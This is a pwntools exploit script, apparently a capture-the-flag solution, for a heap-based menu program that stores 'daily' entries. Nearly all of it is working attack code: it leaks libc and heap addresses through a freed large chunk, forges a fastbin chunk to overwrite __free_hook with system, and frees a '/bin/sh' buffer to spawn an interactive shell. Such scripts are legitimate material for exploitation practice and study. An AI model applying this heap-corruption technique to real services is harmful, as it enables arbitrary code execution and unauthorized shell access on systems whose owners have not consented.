#!/usr/bin/env python
# coding=utf-8
from pwn import *
debug = 0
local = 0
#context.terminal=["tmux","splitw","-h"]
if local:
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    one_offset=0x45216
else:
    a=remote()
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    one_offset=0x45216
elf=ELF("./pwn")

if debug:
    gdb.attach(a,'''
    b *0x000000000400A29          
              ''')
def debug():
    gdb.attach(a,'''
    b *0x000000000400A29
    b *0x000000000400BA7
    ''')
def menu(index):
    a.recvuntil("Your choice:")
    a.sendline(str(index))
def add(size,content):
    menu(2)
    a.recvuntil("Please enter the length of daily:")
    a.sendline(str(size))
    a.recvuntil("Now you can write you daily\n")
    a.send(content)
def delete(index):
    menu(4)
    a.recvuntil("Please enter the index of daily:")
    a.sendline(str(index))
def change(index,content):
    menu(3)
    a.recvuntil("Please enter the index of daily:")
    a.sendline(str(index))
    a.recvuntil("Please enter the new daily")
    a.send(content)
def show():
    menu(1)
add(0x20,"B")#0
add(0x800,"B")#1
add(0x10,"B")#2
delete(1)
add(0x100,"AAAAAAAA")#1,此时2中有libc和heap地址，chunk0剩余部分放入largebin
show()
a.recvuntil("A"*8)
main_arena_addr=u64(a.recv(6).ljust(8,'\x00'))-1352
success("main_arena addr==> 0x%x"%main_arena_addr)

libc_base=main_arena_addr-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)
change(1,"A"*24)
show()
a.recvuntil("A"*24)
heap_addr=u64(a.recv(4).ljust(8,'\x00'))
success("heap_addr ==> 0x%x"%heap_addr)
one_gadget=libc_base+libc.symbols["system"]
success("one_gadget ==> 0x%x"%one_gadget)
malloc_hook_addr=libc_base+libc.symbols["__malloc_hook"]
success("malloc_hook_address ==> 0x%x"%malloc_hook_addr)
fake_chunk=0x7ffff7dd1af5-0x7ffff7a0d000+libc_base-8
success("fake_chunk_addr ==> 0x%x"%fake_chunk)
free_hook_addr=libc_base+libc.symbols["__free_hook"]
add(0x700-8,"BBB")#3
add(0x10,"BBB")#4
add(0x10,"BBB")#5
delete(4)
delete(5)
offset=(heap_addr+0x10-0x000000000602060)/16
payload=p64(0x100)+p64(heap_addr+0x830+0x10)
change(1,payload)
delete(offset)
add(0x10,p64(0x602058))#4
add(0x10,"C")#5
add(0x10,"d")#6
add(0x10,"d")#7
change(7,p64(free_hook_addr))
change(0,p64(one_gadget))
change(1,"/bin/sh\x00")
delete(1)
a.interactive()

